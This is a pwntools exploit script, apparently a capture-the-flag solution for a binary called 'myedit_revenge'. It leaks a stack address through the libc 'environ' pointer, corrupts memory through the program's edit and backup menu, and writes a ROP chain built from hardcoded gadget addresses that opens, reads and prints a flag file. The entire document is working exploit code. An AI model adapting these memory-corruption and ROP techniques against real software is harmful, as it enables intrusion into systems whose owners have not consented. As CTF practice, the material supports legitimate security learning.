from pwn import *
#io = process('./myedit_revenge')
io = process('./pwn')
context(log_level="debug",os="linux",arch="amd64")
#context.terminal = ['tmux', 'splitw', '-h']
pr = lambda x: success('\x1b[01;38;5;214m' + hex(x) + '\x1b[0m')
sl = lambda x: io.sendline(x)
s = lambda x: io.send(x)
rt = lambda x: io.recvuntil(x)
ru = lambda x: u64(io.recv(x).ljust(8,b'\x00'))
ri = lambda x: int(io.recv(x),16)
it = lambda : io.interactive()

pie = 0
def dbg(* addrs):                                                       
    pay = ''                                                                    
    if pie:                                                                     
        for i in addrs:                                                         
            pay += 'b *$rebase( ' + str(i) + ')' + '\n'                         
    else:                                                                       
        for i in addrs:                                                          
            pay += 'b *' + str(i) + '\n'                                        
    gdb.attach(io,pay) 

def cmd(choice):
    rt("Choice: ")
    sl(str(choice))

def edit(content,off=304):
    cmd(1)
    rt("enter new config data: ")
    sl(content)
    rt("Do you want to backup to heap? (y/n): ")
    sl('y')
    if(len(content) < 0x100):
        rt("what off do you want")
        sl(str(off))

def exchange():
    cmd(4)
    rt("give you a choice to set zero")
    sl(b'n')
def set(n = -1):
    cmd(4)
    rt("give you a choice to set zero")
    sl(b'y')
    sl(str(n))
#dbg(0x401F09)  #write
#dbg(0x4020A8)  #change_over
#dbg(0x401D22)  


environ = 0x4F32D0

edit(p64(environ))
cmd(2)
rt(b'\n')
rt(b'\n')
stack = ru(6)-0x1f8#rbp
pr(stack)

edit(b'a'*0xf8+b'@'*8+p64(stack))  #这里确实是写上了，是下面这个交互修改了
exchange()
#dbg(0x401CDB)#choice 1

syscall = 0x0000000000423c36
pop_rdi = 0x00000000004029cf
ret = 0x000000000040101a
pop_rsi = 0x000000000040aa3e 
pop_rax_rdx_rbx = 0x00000000004aa50a 
pop_rdx_rbx = 0x00000000004aa50b 
open = 0x45F090
read = 0x45F1C0
write = 0x45F260

def ed(pd):
    edit(pd)
    set()

def pay(n,date):
    pd = b'a'*(0xc8-n+0x28)+p64(date)  #这里不小心错位了,这里需要额外抬高8字节
    ed(pd)
#total 25*8 = 200 = 0xc8

pd = b'a'*0xc8+b'@'*8+b'////flag'  #pay(0x20,flag)
edit(pd)
set(0)
pd = b'a'*0xc8+b'@'*8+b'////flag'  #pay(0x20,flag)
edit(pd)
set(-2)

pd = b'a'*0xc0+b'@'*8+p64(write) #pay(0x20,flag)
edit(pd)
set(-1)

pd = b'a'*0xb8 + p64(write) #pay(0x28,write)
edit(pd)
set(-1)




#dbg(0x401cdb)#choice_1


pay(0x30,0)
pay(0x38,0x20)
pay(0x40,pop_rdx_rbx)
pay(0x48,stack+0xa00)
pay(0x50,pop_rsi)
pay(0x58,1)
pay(0x60,pop_rdi)
pay(0x68,read)
pay(0x70,0)
pay(0x78,0x20)
pay(0x80,pop_rdx_rbx)
pay(0x88,stack+0xa00)
pay(0x90,pop_rsi)
pay(0x98,3)
pay(0xa0,pop_rdi)   
pay(0xa8,open)
pay(0xb0,0)
pay(0xb8,0)
pay(0xc0,pop_rdx_rbx)
pay(0xc8,0)
pay(0xd0,pop_rsi)
pay(0xd8,stack+0xc8+8)
edit(b'a'*0x10+p64(pop_rdi))
set(-1)

edit(b'a'*0x8+p64(ret))
exchange()
#dbg(0x4021d0)  #choice_4
#dbg(0x40231a)  #return
#pay(0xe8,ret)

cmd(5)


io.interactive()
